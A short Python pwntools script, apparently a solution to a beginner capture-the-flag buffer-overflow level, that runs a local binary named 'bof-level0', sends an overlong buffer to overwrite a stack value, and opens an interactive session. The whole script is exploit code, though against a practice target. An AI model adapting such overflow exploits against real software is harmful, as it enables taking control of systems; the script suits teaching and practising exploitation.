#!/usr/bin/env python

from pwn import *

p = process("./bof-level0")

print(p.recv())

buff = "A" * 20
buff += "ABCDEFGH"

p.sendline(buff)

p.interactive()
